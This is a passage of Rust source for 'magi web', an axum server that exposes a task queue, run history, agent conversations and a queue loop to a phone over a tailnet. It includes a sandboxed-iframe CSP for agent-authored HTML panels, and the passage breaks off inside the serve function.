//! The web UI: magi's queue and run history, readable from a phone.
//!
//! The terminal is the wrong surface for the two things an operator actually
//! does between runs — file a task and check whether the last competition
//! landed. Both happen away from the desk, so they get an HTTP surface: a
//! handful of JSON routes and three embedded files.
//!
//! # One binary
//!
//! `index.html`, `app.css` and `app.js` are compiled in with [`include_str!`].
//! There is no `--assets-dir` and no filesystem fallback, because a UI that
//! reads its own front end from disk breaks the moment the binary is copied
//! somewhere else — which is exactly what `cargo install magi-cli` does. No
//! JS toolchain, no CDN, no remote font: everything the phone needs arrives
//! from this process.
//!
//! # No authentication
//!
//! There is none, deliberately, and the startup log says so. The tailnet is
//! the security boundary: `--bind auto` resolves to this machine's Tailscale
//! address, so the UI is reachable from the operator's own devices and from
//! nothing else. Anyone who can open the URL can file and hold tasks, which is
//! why binding to `0.0.0.0` is not offered and why the fallback when Tailscale
//! is missing is loopback rather than every interface.
//!
//! # Change notification
//!
//! A phone must not poll a full run list on a mobile link. `GET /api/events`
//! is a server-sent stream carrying nothing but two revision numbers — the
//! newest modification time in the queue and under the runs directory — so the
//! client refetches only what moved. The browser's own SSE reconnection covers
//! a sleeping phone; there is no session to lose.
//!
//! # Reading state must never take the server down
//!
//! A corrupt `run.json` is skipped in the list and explained with a 500 on the
//! detail route. No handler unwraps a filesystem or parse result: a single bad
//! file left by a killed run would otherwise turn the whole history into a
//! blank page.
//!
//! # Agent-authored HTML, rendered anyway
//!
//! Everything else here refuses to put API data into the document: `app.js`
//! builds nodes and sets `textContent`, and even an href from a run record is
//! laundered first. A confirmation panel breaks that rule on purpose - an
//! agent asking the owner to approve a merge needs a diff and a table, not one
//! line of prose - and the only reason it is acceptable is that the panel is
//! never part of this document.
//!
//! It is served by [`question_panel`] and [`question_asset`] and rendered in an
//! `<iframe sandbox>` carrying no tokens: no `allow-scripts`, no
//! `allow-same-origin`. So no script in a panel runs, and the frame cannot
//! reach the parent document, the cookie jar or `localStorage`. On top of that
//! both routes send [`PANEL_CSP`], which denies every network destination, so a
//! panel cannot phone home through a remote image or a beacon either - the two
//! things it may load, images and inline CSS, are the two things free
//! formatting actually needs. Assets come from the question's own directory and
//! never from the network, and their content types come from a closed
//! whitelist, so an agent cannot get markup rendered outside the frame by
//! naming a file `.html`.
//!
//! # A conversation turn is not a filesystem read
//!
//! Every other route here is disk work, which is why [`blocking`] exists.
//! `POST /api/talks/{id}/say` is the exception: it spawns an agent CLI and
//! waits tens of seconds for a sentence. It is a plain `await` holding no lock
//! and no executor thread, and concurrent turns on one talk are refused rather
//! than queued - see [`Ui::begin_talk_turn`].
//!
//! # The loop runs here
//!
//! `magi web` runs the queue loop in this process, started and stopped from
//! `/api/loop`. That is the point of the whole surface: a task filed from a
//! phone with nobody around to type `magi serve` is a task that sits in the
//! queue until someone walks back to the machine.
//!
//! It is a tokio task holding a [`daemon::Stop`], not a child process. There
//! is no pid file of this module's own and nothing to supervise - a child
//! would need reaping, a second copy of the daemon's retry policy, and a
//! story for what happens when `magi web` dies with the loop still running.
//! `<home>/daemon.json`, which the loop itself writes, stays the only
//! cross-process signal, and it is how this process notices that the
//! operator's own `magi serve` already owns the loop and refuses to start a
//! second one that would fight it for claims.
//!
//! Stopping is cooperative and therefore not instant. A run in flight is
//! finished first, for the reason [`daemon::serve`] gives: killing the graph
//! mid-node leaves worktrees, branches and agent sessions behind and throws
//! away every agent call already paid for. `POST /api/loop` sets the flag and
//! answers immediately rather than waiting, because the wait is measured in
//! tens of minutes and the operator is holding a phone.

use std::collections::{HashMap, HashSet};
use std::convert::Infallible;
use std::net::{IpAddr, Ipv4Addr, SocketAddr};
use std::path::{Path as FsPath, PathBuf};
use std::pin::Pin;
use std::sync::{Arc, Mutex, MutexGuard, PoisonError};
use std::time::Duration;
use tokio::sync::Notify;

use anyhow::{Context, Result};
use axum::Json;
use axum::Router;
use axum::body::Bytes;
use axum::extract::rejection::JsonRejection;
use axum::extract::{DefaultBodyLimit, Path, Query, State};
use axum::http::{HeaderMap, HeaderValue, StatusCode, header};
use axum::response::sse::{Event, KeepAlive, Sse};
use axum::response::{IntoResponse, Response};
use axum::routing::{delete, get, post};
use jiff::Timestamp;
use serde::{Deserialize, Serialize};
use tokio_stream::StreamExt as _;
use tokio_stream::wrappers::ReceiverStream;

use crate::ask::{Answer, Question, Questions};
use crate::config::{Config, Update, UpdateMode};
use crate::md;
use crate::proc::Quiet as _;
use crate::queue::{Queue, Task, title_from};
use crate::run::{RunState, RunStatus};
use crate::talk::{Talk, Talks};
use crate::{daemon, report, repos, run, talk, updater};

/// Default port. Chosen high and memorable; nothing else in the fleet uses it.
pub const DEFAULT_PORT: u16 = 7878;

/// How often the change stream restats the queue and the runs directory.
const POLL: Duration = Duration::from_secs(1);

/// Keep-alive interval for the change stream. Phones and intermediaries drop
/// an idle connection within a minute; a comment every fifteen seconds keeps
/// the stream alive without waking the radio often enough to matter.
const KEEPALIVE: Duration = Duration::from_secs(15);

/// Ceiling on how long [`run_update_recheck`] ever sleeps between wake-ups.
///
/// A fixed period this long would not track a `[update] interval` shorter
/// than itself: an operator who set `interval = "1m"` to make the deck
/// notice a release within a minute would still wait up to fifteen of them
/// for the next wake-up to even ask [`updater::Checker::should_check`].
/// [`recheck_poll_period`] scales the sleep with the configured interval
/// instead, and this is only its ceiling - reached at the default interval
/// of a day, where waking any more often would just spend cycles asking a
/// question that stays "no" for hours.
const UPDATE_RECHECK_POLL_MAX: Duration = Duration::from_secs(15 * 60);

/// Floor on the same, so a very short `[update] interval` cannot spin
/// [`run_update_recheck`] in a near-busy loop.
const UPDATE_RECHECK_POLL_MIN: Duration = Duration::from_secs(30);

/// Runs returned when the client does not ask, and the ceiling if it asks for
/// more. The cap exists because the list handler parses every `run.json` it
/// returns, and a phone cannot render two thousand rows anyway.
const LIST_DEFAULT: usize = 50;
/// Upper bound for `?limit=`.
const LIST_MAX: usize = 500;

/// Width of a generated task title, matching what the CLI uses.
const TITLE_MAX: usize = 72;

/// Per-file cap for an attachment upload.
///
/// Enforced twice: axum's own body limit is raised one byte above this, only
/// on the two attachment `POST` routes (see the router - every other route
/// keeps the crate-wide default), so an oversize body is still read far
/// enough to answer with our own message below rather than axum's generic
/// one; this constant is what that message and the boundary check actually
/// compare against.
const ATTACHMENT_MAX_BYTES: usize = 10 * 1024 * 1024;

/// The image types an attachment upload accepts - a closed whitelist, the
/// same posture [`asset_content_type`] takes for panel assets and for the
/// same reason: SVG is excluded on purpose because it is active content
/// (it may carry `<script>`) and not merely a picture, so it never appears
/// here even though `image/svg+xml` is a real IANA type.
const ATTACHMENT_MIME_WHITELIST: [&str; 4] = ["image/png", "image/jpeg", "image/gif", "image/webp"];

/// Header carrying the operator's own filename. Free text, stored only for
/// display - see [`talk::Attachment::name`]'s doc on why it never
/// contributes to a path.
const FILENAME_HEADER: &str = "x-filename";

/// The header that makes serving agent-authored HTML defensible, sent by both
/// panel routes and asserted verbatim by a test.
///
/// Read it as a list of things a hostile panel cannot do. `default-src 'none'`
/// denies every fetch destination that is not re-allowed below, which is all of
/// them except images and fonts; `img-src 'self' data:` means an image comes
/// from magi's own asset route or from the document itself, so a panel cannot
/// signal an outside server by pointing an `<img>` at it - the classic
/// exfiltration channel for markup that cannot run script. `style-src
/// 'unsafe-inline'` is the one permission granted, because inline CSS is what
/// free formatting means here and a style sheet cannot make a request that
/// `default-src` has not already allowed. `base-uri 'none'` stops a `<base>`
/// tag re-pointing the relative asset URLs somewhere else, `form-action 'none'`
/// stops a form posting the owner's decision to a third party, and
/// `frame-ancestors 'self'` stops another site framing the panel to phish with
/// it.
///
/// There is deliberately no `script-src`: `default-src 'none'` already covers
/// it, and the sandboxed frame carries no `allow-scripts` either, so script is
/// denied twice over. Weakening any directive here is the difference between a
/// panel the owner reads and a page that can talk to the tailnet, which is why
/// the test compares the whole string rather than looking for a substring.
const PANEL_CSP: &str = "default-src 'none'; img-src 'self' data:; style-src 'unsafe-inline'; \
                         font-src data:; base-uri 'none'; form-action 'none'; \
                         frame-ancestors 'self'";

const INDEX_HTML: &str = include_str!("../assets/ui/index.html");
const APP_CSS: &str = include_str!("../assets/ui/app.css");
const APP_JS: &str = include_str!("../assets/ui/app.js");

/// Which address to listen on.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Bind {
    /// Ask Tailscale, and fall back to loopback with a warning.
    Auto,
    /// An address the operator named.
    Addr(IpAddr),
}

impl std::str::FromStr for Bind {
    type Err = String;

    /// `auto`, or anything [`IpAddr`] accepts. Parsing lives with the type so
    /// the CLI can take `--bind` straight into it: the one spelling of
    /// `auto` that matters is the one this function knows.
    fn from_str(s: &str) -> std::result::Result<Self, Self::Err> {
        if s.eq_ignore_ascii_case("auto") {
            return Ok(Self::Auto);
        }
        s.parse()
            .map(Self::Addr)
            .map_err(|_| format!("expected `auto` or an IP address, got `{s}`"))
    }
}

impl std::fmt::Display for Bind {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Auto => f.write_str("auto"),
            Self::Addr(addr) => write!(f, "{addr}"),
        }
    }
}

/// How to serve.
#[derive(Debug, Clone)]
pub struct Opts {
    /// Address to listen on.
    pub bind: Bind,
    /// Port to listen on.
    pub port: u16,
    /// Repository used for tasks posted without one.
    pub repo: PathBuf,
    /// Print the URL on its own line for a caller that wants to hand it to a
    /// browser. magi never launches one itself.
    pub open: bool,
    /// Merge mode override for the loop this process runs (`none`, `local`,
    /// `pr`); `None` leaves it to each repository's own config.
    ///
    /// The same override `magi serve --merge` takes, and here for the same
    /// reason: `magi web` is now the thing that runs the loop, so an operator
    /// who wants this session's runs to open pull requests has to be able to
    /// say so without going back to the command they no longer type.
    pub merge: Option<String>,
}

impl Default for Opts {
    fn default() -> Self {
        Self {
            bind: Bind::Auto,
            port: DEFAULT_PORT,
            repo: PathBuf::from("."),
            open: false,
            merge: None,
        }
    }
}

/// Everything the handlers touch.
///
/// The queue, the runs directory and the magi home are fields rather than
/// process-global lookups so a test drives the real router against a temp
/// directory instead of the operator's own history.
#[derive(Debug, Clone)]
pub struct Ui {
    queue: Queue,
    questions: Questions,
    talks: Talks,
    runs: PathBuf,
    home: PathBuf,
    repo: PathBuf,
    /// Where the runs' worktrees live, for the health disk figures.
    ///
    /// Spelled independently of [`crate::run::default_worktree_root`] so the
    /// test servers can point it at their own temp directory: the health route
    /// sizes it, and sizing the operator's real `~/wt/magi` from a test would
    /// be measuring the machine instead of the server.
    worktrees_root: PathBuf,
    /// Talks with an agent turn in flight right now.
    ///
    /// In-process and therefore not durable, which is correct: it guards
    /// against two taps on one phone and two phones on one tailnet, both of
    /// which are this process's own concurrency. A second `magi web` would not
    /// see it, and a second `magi web` on the same home is already a
    /// misconfiguration the queue's claims would catch first.
    talk_turns: Arc<Mutex<HashSet<String>>>,
    /// Runs this process is resuming right now.
    ///
    /// Separate from `talk_turns` because a run and a talk are different
    /// things to hold, and a resume is far more expensive to start twice: it
    /// re-asks agent seats. Same reasoning about scope as `talk_turns` — this
    /// guards two taps and two phones, which is this process's own
    /// concurrency.
    resuming: Arc<Mutex<HashSet<String>>>,
    /// The last scan of `[repos] roots`, and when it happened. Shared across
    /// requests so polling `GET /api/repos` repeatedly does not repeat the
    /// filesystem walk every time - see [`repos::Cache`].
    repos_cache: repos::Cache,
    /// Merge mode override handed to the loop this process starts.
    merge: Option<String>,
    /// The loop this process is running, if it is running one.
    looping: Arc<Mutex<LoopState>>,
    /// How a loop is actually started.
    ///
    /// A field rather than a direct call to [`daemon::serve_until`], because
    /// the real loop resolves its queue and its status file through the
    /// process-global magi home and claims whatever it finds there. A test
    /// that started it would reach straight past its own temp directory into
    /// the operator's live queue, overwrite the status file of the `magi
    /// serve` that owns it, and spend real agent quota on a real competition.
    /// What the routes have to get right is the bookkeeping, so the tests
    /// drive the routes against a loop that only starts and stops; production
    /// is [`launch_daemon`] and nothing reassigns it.
    launch: Launch,
}

impl Ui {
    /// A server over explicit paths.
    pub fn new(
        queue: Queue,
        questions: Questions,
        talks: Talks,
        runs: PathBuf,
        home: PathBuf,
        repo: PathBuf,
    ) -> Self {
        Self {
            queue,
            questions,
            talks,
            runs,
            home,
            repo,
            // The default location, overridden by `with_worktrees_root` - a
            // builder step rather than a ninth parameter, for the reason
            // `with_merge` gives.
            worktrees_root: run::default_worktree_root(),
            talk_turns: Arc::default(),
            resuming: Arc::default(),
            repos_cache: repos::Cache::new(),
            merge: None,
            looping: Arc::default(),
            launch: launch_daemon,
        }
    }

    /// The operator's own state: `<home>/queue`, `<home>/questions`,
    /// `<home>/talks`, `<home>/runs`.
    pub fn open(repo: PathBuf) -> Self {
        Self::new(
            Queue::open(),
            Questions::open(),
            Talks::open(),
            run::runs_root(),
            run::home(),
            repo,
        )
    }

    /// The merge mode the loop should use, as the command line gave it.
    ///
    /// A builder step rather than a seventh parameter on [`Ui::new`], because
    /// the override is a property of how this process was invoked and not of
    /// where its state lives - which is all the tests that build a `Ui` by
    /// hand are saying.
    #[must_use]
    pub fn with_merge(mut self, merge: Option<String>) -> Self {
        self.merge = merge;
        self
    }

    /// Where the runs' worktrees live, when it is not the default.
    ///
    /// The health view sizes this directory, so a test that leaves it at the
    /// default would be measuring the operator's own machine.
    #[must_use]
    pub fn with_worktrees_root(mut self, root: PathBuf) -> Self {
        self.worktrees_root = root;
        self
    }

    /// Point the loop at something other than [`launch_daemon`].
    ///
    /// Test-only, and deliberately: see [`Ui::launch`] for why no test in
    /// this crate may start the real loop.
    #[cfg(test)]
    #[must_use]
    fn with_launch(mut self, launch: Launch) -> Self {
        self.launch = launch;
        self
    }

    /// The loop's state, for [`serve`]'s own way out.
    fn looping(&self) -> Arc<Mutex<LoopState>> {
        Arc::clone(&self.looping)
    }

    /// Start the loop in this process, or say who already has one.
    ///
    /// `foreign` is passed in rather than read here so that one request makes
    /// one judgement about who owns the loop: reading the status file again
    /// inside this function could refuse a start for a daemon the same
    /// response then reports as gone.
    fn start_loop(&self, foreign: Option<Foreign>) -> ApiResult<()> {
        if let Some(other) = foreign {
            return Err(ApiError::conflict(format!(
                "{} is already running the loop, so this one will not start a \
                 second: two loops on one queue race for the same claims and \
                 burn the agent quota twice over. Stop it where it was \
                 started.",
                other.who()
            )));
        }
        let mut state = self.lock_loop();
        if state.live.as_ref().is_some_and(Live::alive) {
            return Err(ApiError::conflict(format!(
                "this magi web process (pid {}) is already running the loop",
                std::process::id()
            )));
        }

        let stop = daemon::Stop::new();
        // The CLI's own defaults for everything the UI has no opinion about:
        // one poll interval and one retry budget, so a loop started from a
        // phone behaves exactly like the `magi serve` it replaces.
        let opts = daemon::Opts {
            repo: self.repo.clone(),
            merge: self.merge.clone(),
            // Whatever this `Ui` already reports worktree sizes and folds
            // against (see `with_worktrees_root`) is what the loop it starts
            // must reclaim orphaned worktrees under too - two different
            // opinions about where the worktree bay is would leave the
            // janitor pass reclaiming a directory nothing else on this
            // process is even looking at.
            worktrees_root: Some(self.worktrees_root.clone()),
            ..daemon::Opts::default()
        };
        let launch = self.launch;
        let looping = Arc::clone(&self.looping);
        let handle = tokio::spawn({
            let opts = opts.clone();
            let stop = stop.clone();
            async move {
                let failure = match launch(opts, stop).await {
                    Ok(()) => None,
                    Err(e) => Some(format!("{e:#}")),
                };
                match &failure {
                    Some(why) => tracing::error!("the loop stopped: {why}"),
                    None => tracing::info!("the loop stopped"),
                }
                // Recorded by the task itself rather than reaped by whichever
                // request happens next, so `loop_rev` moves the moment the
                // loop ends and a phone with the change stream open learns
                // that it did. Clearing `live` drops this task's own handle,
                // which only detaches it, and is the last thing it does.
                let mut state = lock_or_recover(&looping);
                state.live = None;
                state.last_error = failure;
                state.rev += 1;
            }
        });
        tracing::info!(
            "the loop is now running in this process: repo {}, merge {}",
            opts.repo.display(),
            opts.merge.as_deref().unwrap_or("as the config says")
        );
        state.live = Some(Live { stop, handle, opts });
        // A fresh start is not the place to keep showing why the last one
        // died; the operator has read it and pressed the button anyway.
        state.last_error = None;
        state.rev += 1;
        Ok(())
    }

    /// Ask the loop to stop, without waiting for it to get there.
    ///
    /// Idempotent: a second tap on stop is not an error, because the first one
    /// leaves the loop running for as long as the run in flight takes and the
    /// operator has no way to tell a slow stop from a lost one.
    fn stop_loop(&self, foreign: Option<Foreign>, park: bool) -> ApiResult<()> {
        if let Some(other) = foreign {
            return Err(ApiError::conflict(format!(
                "the loop belongs to {}, and this process cannot stop it - \
                 stop it where it was started. A button that silently did \
                 nothing would be worse than this refusal.",
                other.who()
            )));
        }
        let mut state = self.lock_loop();
        let Some(live) = state.live.as_ref() else {
            return Ok(());
        };
        // A park upgrades a stop that has already been asked for: the
        // operator who tapped "stop" and then realised the run has an hour
        // left must not have to restart the loop to change their mind.
        if live.stop.stopped() && (!park || live.stop.parking()) {
            return Ok(());
        }
        if park {
            live.stop.park();
            tracing::info!("the loop was asked to park; the run stops at its next node boundary");
        } else {
            live.stop.stop();
            tracing::info!("the loop was asked to stop; a run in flight is finished first");
        }
        state.rev += 1;
        Ok(())
    }

    /// The loop as both `/api/loop` and `/api/health` report it.
    ///
    /// `reading` is the caller's single read of `<home>/daemon.json`, because
    /// health answers with this view *and* the daemon object beside it: one
    /// read per response is what stops a single answer naming a foreign owner
    /// in one field and calling the loop free in the other.
    fn loop_view(&self, reading: Option<daemon::Reading>) -> LoopView {
        let state = self.lock_loop();
        // A loop that panicked never recorded its own end, so the handle -
        // not the presence of the record - is what "running" means.
        let live = state.live.as_ref().filter(|live| live.alive());
        LoopView {
            running: live.is_some(),
            stopping: live.is_some_and(|live| live.stop.finishing()),
            parking: live.is_some_and(|live| live.stop.parking()),
            owned: live.is_some(),
            repo: live
                .map_or(&self.repo, |live| &live.opts.repo)
                .display()
                .to_string(),
            merge: live.map_or_else(|| self.merge.clone(), |live| live.opts.merge.clone()),
            last_error: state.last_error.clone(),
            daemon: DaemonView::of(reading),
        }
    }

    /// Take the loop lock. See [`lock_or_recover`] for why it cannot fail.
    fn lock_loop(&self) -> MutexGuard<'_, LoopState> {
        lock_or_recover(&self.looping)
    }

    /// Whether this process currently owns the agent turn for `id`.
    ///
    /// This deliberately describes only the in-memory claim made by
    /// [`Ui::begin_talk_turn`]. It is not conversation data and therefore is
    /// never persisted with a [`Talk`].
    fn is_thinking(&self, id: &str) -> bool {
        lock_or_recover(&self.talk_turns).contains(id)
    }

    /// Claim the right to run one turn in a talk, or refuse.
    ///
    /// A talk is strictly turn-based: the agent is resumed with the
    /// conversation it already has, so two turns running at once would resume
    /// the same session twice and append their answers in whatever order the
    /// two CLIs finished in. The operator would come back to a transcript
    /// with two half-turns interleaved, which is unreadable and, worse,
    /// unfixable - there is no undo for a persisted turn.
    ///
    /// Refusing with a conflict rather than queueing behind the first turn is
    /// the deliberate half. A turn takes tens of seconds, so a phone on a slow
    /// link is exactly the case where the operator taps send twice; queueing
    /// would answer the second tap with a second agent turn on text they only
    /// meant to send once, and would do it a minute later when they have
    /// stopped looking. An immediate 409 is a thing the front end can act on.
    ///
    /// The lock is a `std::sync::Mutex` and never crosses an `await`: it is
    /// taken to test-and-insert and released before the agent is spawned. The
    /// returned guard removes the id on drop, which is what makes a panicking
    /// handler or a phone that walks out of range leave the talk usable - axum
    /// drops the handler future when the client disconnects, and without the
    /// guard that talk would be wedged until the server restarted.
    fn begin_talk_turn(&self, id: &str) -> ApiResult<TalkTurnGuard> {
        let mut live = self
            .talk_turns
            .lock()
            .map_err(|_| ApiError::internal("the talk turn lock was poisoned"))?;
        if !live.insert(id.to_owned()) {
            return Err(ApiError::conflict(format!(
                "talk {id} is already taking a turn"
            )));
        }
        Ok(TalkTurnGuard {
            talk: id.to_owned(),
            turns: Arc::clone(&self.talk_turns),
        })
    }

    /// Park the loop for an upgrade, and report the run that is parking.
    ///
    /// A park rather than a stop: a stop waits out the whole competition, and
    /// not waiting is the point of upgrading from a phone. `None` means
    /// nothing was in flight, which is worth saying so the operator is not
    /// told a run is parking when none is.
    fn park_for_upgrade(&self) -> ApiResult<Option<String>> {
        let parking = {
            let mut state = self.lock_loop();
            let Some(live) = state.live.as_ref() else {
                return Ok(None);
            };
            let busy = live.stop.busy_now();
            live.stop.park();
            state.rev += 1;
            busy
        };
        Ok(if parking {
            // More than one run can be in flight now (see
            // `Config::daemon.max_concurrent_runs`); this answer names one of
            // them so the operator sees a park actually happened, not every
            // run a park now asks to stop at its next boundary.
            daemon::current_work(&self.home, jiff::Timestamp::now())
                .into_iter()
                .next()
                .map(|c| c.run)
        } else {
            None
        })
    }

    /// Claim a run for a resume, on the same reasoning as
    /// [`Ui::begin_talk_turn`]: a guard that releases on drop, so a
    /// disconnected phone does not wedge the run until the server restarts.
    fn begin_resume(&self, id: &str) -> ApiResult<ResumeGuard> {
        let mut live = self
            .resuming
            .lock()
            .map_err(|_| ApiError::internal("the resume lock was poisoned"))?;
        if !live.insert(id.to_owned()) {
            return Err(ApiError::conflict(format!(
                "run {id} is already being resumed"
            )));
        }
        Ok(ResumeGuard {
            run: id.to_owned(),
            resuming: Arc::clone(&self.resuming),
        })
    }

    /// The router, with this state baked in.
    ///
    /// The three front-end files get one explicit route each rather than a
    /// path parameter, so there is no traversal surface to get wrong: the set
    /// of servable paths is the set written here. The asset route below is the
    /// one exception and the only place in this server where a client names a
    /// file; it is why [`valid_asset_name`] is checked before a path is built.
    pub fn router(self) -> Router {
        Router::new()
            .route("/", get(index))
            .route("/app.css", get(app_css))
            .route("/app.js", get(app_js))
            .route("/api/health", get(health))
            .route("/api/loop", get(loop_get).post(loop_post))
            .route("/api/upgrade", post(upgrade_post))
            .route("/api/runs", get(runs_list))
            .route("/api/runs/{id}", get(run_detail).delete(run_delete))
            .route("/api/runs/{id}/report", get(run_report))
            .route("/api/runs/{id}/fold", post(run_fold))
            .route("/api/runs/{id}/resume", post(run_resume))
            .route("/api/queue", get(queue_list))
            .route("/api/queue/{id}", delete(queue_delete))
            .route("/api/repos", get(repos_list))
            .route("/api/queue/{id}/hold", post(queue_hold))
            .route("/api/queue/{id}/release", post(queue_release))
            .route("/api/queue/{id}/priority", post(queue_priority))
            .route("/api/queue/{id}/edit", post(queue_edit))
            .route("/api/queue/{id}/done", post(queue_done))
            .route("/api/questions", get(questions_list))
            .route("/api/questions/{id}/answer", post(question_answer))
            .route("/api/questions/{id}/say", post(question_say))
            .route("/api/questions/{id}/panel", get(question_panel))
            // The same asset, reachable from inside the panel by its bare
            // filename. A document served at `.../panel` resolves `shot.png`
            // to `.../shot.png`, which is not the asset route, so a panel
            // written the way its author was told to write it showed broken
            // images. `base-uri 'none'` means a `<base>` tag cannot paper over
            // it - deliberately - so the fix is that the panel's own URL ends
            // in a filename and its siblings are the assets.
            .route("/api/questions/{id}/panel/index.html", get(question_panel))
            .route("/api/questions/{id}/panel/{name}", get(question_asset))
            .route("/api/questions/{id}/asset/{name}", get(question_asset))
            .route("/api/talks", get(talks_list).post(talk_post))
            .route("/api/talks/{id}", get(talk_detail).delete(talk_delete))
            .route("/api/talks/{id}/say", post(talk_say))
            .route("/api/talks/{id}/close", post(talk_close))
            .route("/api/talks/{id}/reopen", post(talk_reopen))
            // `DefaultBodyLimit` is raised only on this one route - every
            // other route on this server answers in a few kilobytes, and
            // widening the crate-wide default for all of them just because
            // one accepts a picture would let any other handler be handed
            // a multi-megabyte body it never expects.
            .route(
                "/api/talks/{id}/attachments",
                post(talk_attachment_post).layer(DefaultBodyLimit::max(ATTACHMENT_MAX_BYTES + 1)),
            )
            .route(
                "/api/talks/{id}/attachments/{att}",
                get(talk_attachment_get),
            )
            .route("/api/events", get(events))
            .with_state(Arc::new(self))
    }
}

/// One talk's turn slot, released on drop.
///
/// A guard rather than a matching `remove` at the end of the handler, because
/// the handler has several early returns and one `await` that can be cancelled
/// out from under it. A leaked id is a talk nobody can talk to again.
#[derive(Debug)]
struct TalkTurnGuard {
    talk: String,
    turns: Arc<Mutex<HashSet<String>>>,
}

impl Drop for TalkTurnGuard {
    fn drop(&mut self) {
        if let Ok(mut live) = self.turns.lock() {
            live.remove(&self.talk);
        }
    }
}

/// Releases a resume claim, so a run is resumable again after the attempt.
struct ResumeGuard {
    run: String,
    resuming: Arc<Mutex<HashSet<String>>>,
}

impl Drop for ResumeGuard {
    fn drop(&mut self) {
        if let Ok(mut live) = self.resuming.lock() {
            live.remove(&self.run);
        }
    }
}

/// Bind the port, waiting briefly for a predecessor to let go of it.
///
/// A restart hands the address from one process to the next, and the old one
/// holds its listener until it unwinds. A single `bind` can lose that race,
/// and for a restart triggered from a phone that means the deck never comes
/// back with no terminal around to say why.
///
/// Bounded, and only for the one error a wait can fix: anything else fails at
/// once, because retrying it would turn a clear message into a silence.
async fn bind_waiting(socket: SocketAddr) -> Result<tokio::net::TcpListener> {
    const WINDOW: Duration = Duration::from_secs(10);
    const GAP: Duration = Duration::from_millis(250);

    let deadline = std::time::Instant::now() + WINDOW;
    let mut said = false;
    loop {
        match tokio::net::TcpListener::bind(socket).await {
            Ok(listener) => return Ok(listener),
            Err(e)
                if e.kind() == std::io::ErrorKind::AddrInUse
                    && std::time::Instant::now() < deadline =>
            {
                if !said {
                    said = true;
                    tracing::info!(
                        "{socket} is still held - waiting up to {}s for it, \
                         which is what a restart looks like from here",
                        WINDOW.as_secs()
                    );
                }
                tokio::time::sleep(GAP).await;
            }
            Err(e) => return Err(e).with_context(|| format!("bind {socket}")),
        }
    }
}

/// Signalled when an upgrade has replaced the binary and the successor should
/// take this address over. One per process: there is one address to hand on.
static HANDOVER: std::sync::LazyLock<Notify> = std::sync::LazyLock::new(Notify::new);

/// Start this binary again with the same arguments, detached.
///
/// Called from [`serve`]'s exit path, *after* the listener has been dropped,
/// so the address is already free when the successor binds it. The first
/// attempt at this spawned the successor two hundred milliseconds before
/// exiting instead, and the released binary - which has no bind retry - died
/// on "address already in use" with its stdio sent to null, so the deck
/// simply never came back.
///
/// Detached and without inherited stdio: the successor has to outlive this
/// process, and must not hold open a pipe a terminal is waiting on.
fn spawn_successor() -> Result<()> {
    let exe = std::env::current_exe().context("find this binary")?;
    let args: Vec<String> = std::env::args().skip(1).collect();
    tracing::info!("restarting: {} {}", exe.display(), args.join(" "));

    let mut cmd = std::process::Command::new(&exe);
    cmd.args(&args)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null());
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt as _;
        // DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP: no console to inherit,
        // and Ctrl-C in the old terminal must not reach the successor.
        cmd.creation_flags(0x0000_0008 | 0x0000_0200);
    }
    cmd.spawn().context("start the successor")?;
    Ok(())
}

/// Serve the UI until Ctrl-C, finishing a run the loop has in flight.
///
/// The server itself owns no state, so nothing here is graceful for the HTTP
/// side's sake: the connections go with the dropped listener, which costs a
/// phone one change-stream reconnection it was going to make anyway.
///
/// The signal branch is not optional now that the loop lives in this process.
/// [`daemon::serve_until`] listens for Ctrl-C itself, and a registered
/// handler is what stops the signal terminating the process - so without a
/// branch of our own, the first Ctrl-C after the operator started the loop
/// would stop the loop and leave `magi web` listening forever, unkillable
/// from the terminal it was started in.
///
/// What it waits for is the loop, not the sockets. A run in flight is
/// finished first, for the reason [`daemon::serve`] gives: killing the graph
/// mid-node leaves worktrees, branches and agent sessions behind and throws
/// away every agent call already paid for.
///
/// The server therefore runs on a task of its own rather than inside the
/// `select!`: an arm that resolves *drops* the futures the other arms were
/// polling, so serving the address from inside one would take the deck down
/// at the instant the handover began and keep it down for the whole park -
/// up to `timeout_implement`, an hour by default. See [`hand_over`], which
/// owns the order.
pub async fn serve(opts: Opts) -> Result<()> {
    let (addr, warning) = resolve_bind(&opts.bind);
    if let Some(warning) = warning {
        tracing::warn!("{warning}");
    }

    // Process-global, and therefore set exactly once, here: the report route
    // must never emit escape sequences into a browser, and toggling the flag
    // per request would race with a concurrent request rendering its own
    // report. Startup is the only moment at which no request can observe the
    // change. Nothing in the server turns colour back on.
    report::set_color(false);

    let ui = Ui::open(opts.repo).with_merge(opts.merge);
    // Cloned before `ui.router()` consumes `ui` below: `hand_over` needs the
    // home to bracket the parking and restarting stages, and `run_update_recheck`
    // needs both it and the repo, and by then there is no `ui` left to read
    // them from.
    let home = ui.home.clone();
    let repo = ui.repo.clone();
    // Settles a progress record a predecessor left non-terminal - either this
    // *is* the successor `spawn_successor` started, or the previous process
    // died mid-handover. Before the router starts answering, so the very
    // first `/api/health` a phone gets from this process already reflects it.
    updater::reconcile_after_restart(&home);
    // `magi web` can stay up for days, and the one-time check `main.rs`'s
    // `spawn_update_check` does at startup only ever runs once: after that,
    // `/api/health`'s `update` field - and the phone's "Update & restart"
    // button, which reads the very same cache - would stay frozen on
    // whatever that single check found, no matter how many releases ship
    // afterwards. This keeps it current instead. Detached: it must keep
    // going for as long as this process serves, `serve` has nothing to await
    // it for, and it exits on its own the moment the process does.
    tokio::spawn(run_update_recheck(repo, home.clone()));
    let looping = ui.looping();
    let socket = SocketAddr::new(addr, opts.port);
    let listener = bind_waiting(socket).await?;
    let url = format!("http://{addr}:{}", opts.port);
    tracing::info!(
        "magi web UI on {url} - there is no authentication, so anyone who can \
         reach this address can file and hold tasks: the tailnet is the \
         security boundary"
    );
    tracing::info!(
        "the queue loop is not running yet - start it from the UI, which is \
         the whole reason this process can: nothing in the queue moves until \
         something is running the loop"
    );
    if opts.open {
        // The URL alone on stdout, for a caller that wants to open it. magi
        // does not spawn a browser: on the machine this usually runs on there
        // is no display, and a failed launch would be the only output.
        println!("{url}");
    }

    // On its own task, so nothing this function awaits can stop the address
    // being answered. `hand_over` is where it is given up.
    let mut served = tokio::spawn(axum::serve(listener, ui.router()).into_future());
    let interrupted = async {
